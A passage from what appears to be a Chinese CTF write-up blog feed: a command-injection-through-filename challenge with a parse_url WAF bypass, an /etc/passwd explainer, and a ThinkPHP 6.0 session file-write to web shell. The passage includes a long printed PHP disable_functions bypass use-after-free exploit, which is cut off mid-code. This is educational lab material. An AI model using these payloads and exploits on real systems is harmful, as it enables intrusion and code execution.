invoke__">parse_str</span>(<span class="hljs-variable">$uri</span>[<span class="hljs-string">&#x27;query&#x27;</span>], <span class="hljs-variable">$query</span>);<br><span class="hljs-comment">//    var_dump($query);</span><br><span class="hljs-comment">//    die();</span><br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$keywords</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$token</span>)<br>    &#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$query</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$k</span>, <span class="hljs-variable">$token</span>))<br>                <span class="hljs-title function_ invoke__">hacker</span>();<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$v</span>, <span class="hljs-variable">$token</span>))<br>                <span class="hljs-title function_ invoke__">hacker</span>();<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p><code>parse_str()</code> 函数把查询字符串解析到变量中。</p><p><code>parse_url()</code></p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304142337952.png" alt="image-20230414233728810"></p><p><code>parse_url</code>在url不能被解析的时候就会返回false</p><p>如果我们直接读取：<code>ffffllllaaaaggg.php</code>文件，会被waf检测到，我们可以让<code>parse_url</code>解析错误，这样就能绕过了</p><p><a href="https://www.cnblogs.com/tr1ple/p/11137159.html">parse_url小结</a></p><p>一种方法是加三个斜杠 <code>///</code></p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304142349541.png" alt="image-20230414234946408"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (FLAG_SIG != <span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;you can not visit it directly&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can find sth in m4aaannngggeee&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>我们继续读：<code>m4aaannngggeee.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (FLAG_SIG != <span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;you can not visit it directly&quot;</span>);<br>&#125;<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;templates/upload.html&quot;</span>;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>访问：<code>/templates/upload.html</code>：</p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304142352891.png" alt="image-20230414235225798" style="zoom:33%;" /><p>有一个假的文件上传，<code>upllloadddd.php</code></p><p>我们尝试获得源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$allowtype</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>,<span class="hljs-string">&quot;jpg&quot;</span>);<br><span class="hljs-variable">$size</span> = <span class="hljs-number">10000000</span>;<br><span class="hljs-variable">$path</span> = <span class="hljs-string">&quot;./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>;<br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>],<span class="hljs-variable">$path</span>.<span class="hljs-variable">$filename</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error:can not move&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error:not an upload file！&quot;</span>);<br>&#125;<br><span class="hljs-variable">$newfile</span> = <span class="hljs-variable">$path</span>.<span class="hljs-variable">$filename</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;file upload success&lt;br /&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$filename</span>;<br><span class="hljs-variable">$picdata</span> = <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>.<span class="hljs-variable">$filename</span>.<span class="hljs-string">&quot; | base64 -w 0&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;data:image/png;base64,&quot;</span>.<span class="hljs-variable">$picdata</span>.<span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;error&#x27;</span>]&gt;<span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$newfile</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Upload file error: &quot;</span>);<br>&#125;<br><span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">array_pop</span>(<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]));<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$ext</span>,<span class="hljs-variable">$allowtype</span>))&#123;<br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$newfile</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>注意如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$picdata</span> = <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>.<span class="hljs-variable">$filename</span>.<span class="hljs-string">&quot; | base64 -w 0&quot;</span>);<br></code></pre></td></tr></table></figure><p>通过上传的文件名进行命令执行</p><p>我们访问：<code>m4aaannngggeee.php</code></p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304142353647.png" alt="image-20230414235312439" style="zoom: 33%;" /><p>这里有一个真的文件上传</p><p>我们上传文件：文件名(<code>;ls;#</code>)</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304142358424.png" alt="image-20230414235827288"></p><p>返回上一级查看flag：斜杠被过滤了，我们使用<code>cd ..</code></p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304142359668.png" alt="image-20230414235928584"></p><p>然后cat查看flag即可</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>eating_cms</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>etc_passwd</title>
    <link href="/2023/08/24/etc_passwd/"/>
    <url>/2023/08/24/etc_passwd/</url>
    
    <content type="html"><![CDATA[<h2 id="etc-passwd"><a href="#etc-passwd" class="headerlink" title="&#x2F;etc&#x2F;passwd"></a>&#x2F;etc&#x2F;passwd</h2><p><code>/etc/passwd</code> 是一个文件，它记录了系统上的用户账号信息。每行记录表示一个用户账号，每行记录包含了如下字段：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-symbol">username:</span><span class="hljs-symbol">password:</span><span class="hljs-variable constant_">UID</span><span class="hljs-symbol">:GID</span><span class="hljs-symbol">:GECOS</span><span class="hljs-symbol">:home_directory</span><span class="hljs-symbol">:login_shell</span><br></code></pre></td></tr></table></figure><ul><li><code>username</code>：用户登录名</li><li><code>password</code>：加密后的用户密码，现在一般为 “x”，表示密码存储在 <code>/etc/shadow</code> 文件中</li><li><code>UID</code>：用户ID，是一个整数值，用来唯一标识该用户</li><li><code>GID</code>：用户所属的组ID</li><li><code>GECOS</code>：用户的全名或注释信息</li><li><code>home_directory</code>：用户的主目录</li><li><code>login_shell</code>：用户登录后使用的默认shell程序</li></ul><p>例如，下面是一个 <code>/etc/passwd</code> 文件的示例：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">root:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span><br><span class="hljs-symbol">daemon:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:daemon</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">bin:</span><span class="hljs-symbol">x:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:bin</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br></code></pre></td></tr></table></figure><p>可以使用 <code>cat</code> 命令来查看 <code>/etc/passwd</code> 文件的内容，例如：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/etc/</span>passwd<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>etc_passwd</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>EasyThinking</title>
    <link href="/2023/08/24/EasyThinking/"/>
    <url>/2023/08/24/EasyThinking/</url>
    
    <content type="html"><![CDATA[<h2 id="GYCTF2020-EasyThinking"><a href="#GYCTF2020-EasyThinking" class="headerlink" title="[GYCTF2020]EasyThinking"></a>[GYCTF2020]EasyThinking</h2><p>使用御剑扫描发现了 <code>www.zip</code>，我们直接把源码下载下来</p><p>访问一个不存在的目录，发现是 <code>thinkphp6.0.0</code></p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304151225351.png" alt="image-20230415122510252"></p><p>网上搜一下，发现有很多漏洞复现文章：</p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304151226385.png" alt="image-20230415122655269" style="zoom:33%;" /><p><a href="https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP6/ThinkPHP6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99.md">thinkphp6.0存在任意文件写入漏洞</a></p><p>简单的说就是会根据 <code>PHPSESSID</code>的值来创建对应值的文件（需要长度等于32）</p><p>我们先注册一个账号，然后登录的时候修改<code>PHPSESSID=0123456789012345678912345678.php</code></p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304151252675.png" alt="image-20230415125211612" style="zoom:33%;" /><p>登录之后 ，就会在 <code>/runtime/session/</code>下生成一个<code>sess_</code>开头的session文件，此处是：</p><p><code>sess_0123456789012345678912345678.php</code></p><p>然后我们分析源码中的 <code>Member.php</code></p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304151257180.png" alt="image-20230415125721516" style="zoom:33%;" /><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php">...<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">search</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Request</span>::<span class="hljs-title function_ invoke__">isPost</span>())&#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&#x27;?UID&#x27;</span>))<br>            &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">redirect</span>(<span class="hljs-string">&#x27;/home/member/login&#x27;</span>);            <br>            &#125;<br>            <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">input</span>(<span class="hljs-string">&quot;post.&quot;</span>);<br>            <span class="hljs-variable">$record</span> = <span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;Record&quot;</span>);<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;Record&quot;</span>))<br>            &#123;<br>                <span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;Record&quot;</span>,<span class="hljs-variable">$data</span>[<span class="hljs-string">&quot;key&quot;</span>]);<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                <span class="hljs-variable">$recordArr</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-variable">$record</span>);<br>                <span class="hljs-variable">$recordLen</span> = <span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$recordArr</span>);<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$recordLen</span> &gt;= <span class="hljs-number">3</span>)&#123;<br>                    <span class="hljs-title function_ invoke__">array_shift</span>(<span class="hljs-variable">$recordArr</span>);<br>                    <span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;Record&quot;</span>,<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-variable">$recordArr</span>) . <span class="hljs-string">&quot;,&quot;</span> . <span class="hljs-variable">$data</span>[<span class="hljs-string">&quot;key&quot;</span>]); <span class="hljs-comment">//这里将我们搜索的内容存入session中，因此我们可以从这里写入一句话木马</span><br>                    <span class="hljs-keyword">return</span> <span class="hljs-title class_">View</span>::<span class="hljs-title function_ invoke__">fetch</span>(<span class="hljs-string">&quot;result&quot;</span>,[<span class="hljs-string">&quot;res&quot;</span> =&gt; <span class="hljs-string">&quot;There&#x27;s nothing here&quot;</span>]);<br>                &#125;<br><br>            &#125;<br>            <span class="hljs-title function_ invoke__">session</span>(<span class="hljs-string">&quot;Record&quot;</span>,<span class="hljs-variable">$record</span> . <span class="hljs-string">&quot;,&quot;</span> . <span class="hljs-variable">$data</span>[<span class="hljs-string">&quot;key&quot;</span>]);<br>            <span class="hljs-keyword">return</span> <span class="hljs-title class_">View</span>::<span class="hljs-title function_ invoke__">fetch</span>(<span class="hljs-string">&quot;result&quot;</span>,[<span class="hljs-string">&quot;res&quot;</span> =&gt; <span class="hljs-string">&quot;There&#x27;s nothing here&quot;</span>]);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">View</span>(<span class="hljs-string">&quot;search&quot;</span>);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>通过search功能，我们可以将一句话木马写入session文件内容中去</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304151302321.png" alt="image-20230415130221256"></p><p>直接使用蚁剑连接：<code>/runtime/session/sess_0123456789012345678912345678.php</code></p><p>在根目录下找到flag，但是没有权限去读，同目录下还有一个<code>readflag</code>文件，因此我们需要去执行该文件，读取到flag</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304151305662.png" alt="image-20230415130511511"></p><p>禁用了很多函数，使用蚁剑的插件也用不了，</p><p>网上找到了： <a href="https://github.com/leekosss/exploits/blob/master/php-filter-bypass/exploit.php">PHP 7.0-8.0 disable_functions bypass</a></p><p>我们使用它，使用蚁剑上传到服务器：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment"># PHP 7.0-8.0 disable_functions bypass PoC (*nix only)</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Bug: https://bugs.php.net/bug.php?id=54350</span><br><span class="hljs-comment"># </span><br><span class="hljs-comment"># This exploit should work on all PHP 7.0-8.0 versions</span><br><span class="hljs-comment"># released as of 2021-10-06</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Author: https://github.com/mm0r1</span><br><br><span class="hljs-title function_ invoke__">pwn</span>(<span class="hljs-string">&#x27;/readflag&#x27;</span>);    <span class="hljs-comment">//修改这里为 /readflag</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pwn</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123;<br>    <span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;LOGGING&#x27;</span>, <span class="hljs-literal">false</span>);<br>    <span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;CHUNK_DATA_SIZE&#x27;</span>, <span class="hljs-number">0x60</span>);<br>    <span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;CHUNK_SIZE&#x27;</span>, ZEND_DEBUG_BUILD ? CHUNK_DATA_SIZE + <span class="hljs-number">0x20</span> : CHUNK_DATA_SIZE);<br>    <span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;FILTER_SIZE&#x27;</span>, ZEND_DEBUG_BUILD ? <span class="hljs-number">0x70</span> : <span class="hljs-number">0x50</span>);<br>    <span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;STRING_SIZE&#x27;</span>, CHUNK_DATA_SIZE - <span class="hljs-number">0x18</span> - <span class="hljs-number">1</span>);<br>    <span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;CMD&#x27;</span>, <span class="hljs-variable">$cmd</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">10</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$groom</span>[] = <span class="hljs-title class_">Pwn</span>::<span class="hljs-title function_ invoke__">alloc</span>(STRING_SIZE);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">stream_filter_register</span>(<span class="hljs-string">&#x27;pwn_filter&#x27;</span>, <span class="hljs-string">&#x27;Pwn&#x27;</span>);<br>    <span class="hljs-variable">$fd</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;php://memory&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">stream_filter_append</span>(<span class="hljs-variable">$fd</span>,<span class="hljs-string">&#x27;pwn_filter&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fd</span>, <span class="hljs-string">&#x27;x&#x27;</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123; <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span>, <span class="hljs-variable">$c</span>; &#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pwn</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">php_user_filter</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$abc_addr</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$helper</span>, <span class="hljs-variable">$helper_addr</span>, <span class="hljs-variable">$helper_off</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$uafp</span>, <span class="hljs-variable">$hfp</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$in</span>, <span class="hljs-variable">$out</span>, &amp;<span class="hljs-variable">$consumed</span>, <span class="hljs-variable">$closing</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$closing</span>) <span class="hljs-keyword">return</span>;<br>        <span class="hljs-title function_ invoke__">stream_bucket_make_writeable</span>(<span class="hljs-variable">$in</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;filtername = <span class="hljs-title class_">Pwn</span>::<span class="hljs-title function_ invoke__">alloc</span>(STRING_SIZE);<br>        <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$this</span>-&gt;stream);<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">go</span>();<br>        <span class="hljs-keyword">return</span> PSFS_PASS_ON;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">go</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;abc = &amp;<span class="hljs-variable language_">$this</span>-&gt;filtername;<br><br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">make_uaf_obj</span>();<br><br>        <span class="hljs-variable language_">$this</span>-&gt;helper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Helper</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;helper-&gt;b = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"><span class="hljs-variable">$x</span></span>) </span>&#123;&#125;;<br><br>        <span class="hljs-variable language_">$this</span>-&gt;helper_addr = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">str2ptr</span>(CHUNK_SIZE * <span class="hljs-number">2</span> - <span class="hljs-number">0x18</span>) - CHUNK_SIZE * <span class="hljs-number">2</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;helper @ 0x%x&quot;</span>, <span class="hljs-variable">$this</span>-&gt;helper_addr);<br><br>        <span class="hljs-variable language_">$this</span>-&gt;abc_addr = <span class="hljs-variable language_">$this</span>-&gt;helper_addr - CHUNK_SIZE;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;abc @ 0x%x&quot;</span>, <span class="hljs-variable">$this</span>-&gt;abc_addr);<br><br>        <span class="hljs-variable language_">$this</span>-&gt;helper_off = <span class="hljs-variable language_">$this</span>-&gt;helper_addr - <span class="hljs-variable language_">$this</span>-&gt;abc_addr - <span class="hljs-number">0x18</span>;<br><br>        <span class="hljs-variable">$helper_handlers</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">str2ptr</span>(CHUNK_SIZE);<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;helper handlers @ 